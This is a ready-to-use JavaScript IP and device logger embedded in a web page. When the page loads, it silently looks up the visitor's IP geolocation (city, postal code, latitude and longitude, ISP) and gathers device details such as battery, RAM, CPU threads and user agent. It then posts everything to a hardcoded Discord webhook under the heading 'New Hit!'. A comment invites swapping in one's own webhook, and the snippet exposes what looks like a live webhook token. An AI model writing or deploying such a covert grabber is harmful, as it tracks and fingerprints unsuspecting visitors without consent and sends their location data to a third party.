<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
<script>

  $(document).ready(function () {

    let ip
    let country
    let countryCode
    let region
    let regionName
    let city
    let zip
    let lat
    let lon
    let timezone
    let org
    let batterypercentage
    let ischarging
    let platform
    let networkinfo
    let networkinformation
    let width
    let height
    let devicelang
    let iscookieEnabled
    let userAgent
    let cpuThreads
    let deviceram
    let referurl
    let datetime = new Date();
    let localtime
    async function getInfo() {
      await fetch('https://ip-api.io/json')
        .then(response => response.json())
        .then(data => {
          ip = data.ip
          country = data.country_name
          countryCode = data.country_code
          region = data.region_code
          regionName = data.region_name
          city = data.city
          zip = data.zip_code
          lat = data.latitude
          lon = data.longitude
          timezone = data.time_zone
          org = data.organisation
        })

      let battery = await navigator.getBattery();
      batterypercentage = String(battery.level * 100 + "%");
      ischarging = String(battery.charging);
      platform = String(navigator.platform);
      width = String(window.innerWidth);
      height = String(window.innerHeight);
      devicelang = String(navigator.language);
      iscookieEnabled = String(navigator.cookieEnabled);
      userAgent = String(navigator.userAgent || navigator.vendor || window.opera);
      cpuThreads = String(navigator.hardwareConcurrency);
      deviceram = String(navigator.deviceMemory + "GB");
      referurl = String(window.location.href);
      localtime = String(datetime.toLocaleString());

      await sendWebhook();
    }
    getInfo();

    function sendWebhook() {
      /*Change here the webhookUrl for your discord webhook url*/
      const webhookUrl = "https://canary.discord.com/api/webhooks/997564452129996900/oNxa5B6Ggk8wdx-7GeqevZYOSbJp6ouYfBjNbcKzivElYAH3yyf336UkAyMe09XzNlg-"

      let request = new XMLHttpRequest();
      request.open("POST", webhookUrl);
      request.setRequestHeader('Content-type', 'application/json');
      let params = {
        "content": null,
        "embeds": [
          {
            "title": "New Hit!",
             "description": `IP:** ${ip} \n**ISP:** ${org} \n**Country:** ${country} \n**Country Code:** ${countryCode } \n**Region Name:** ${regionName} \n**Region:** ${region} \n**City:** ${city} \n**Zip/Postal Code:** ${zip} \n**Latitude:** ${lat} \n**Longitude:** ${lon} \n**Timezone:** ${timezone} \n**Local Time:** ${localtime} \n**Cookies Enabled:** ${iscookieEnabled} \n**Device Language:** ${devicelang} \n**Screen Width:** ${width} \n**Screen Height:** ${height} \n**Platform:** ${platform} \n**User Agent:** ${userAgent} \n**Battery Level:** ${batterypercentage} \n**Charging:** ${ischarging} \n**CPU Threads:** ${cpuThreads} \n**RAM:** ${deviceram} \n**From URL:** ${referurl}**`,
            "color": 10493984,
            "timestamp": datetime
          }
        ],
        "attachments": []
      }
      request.send(JSON.stringify(params));
    }
  });
</script>
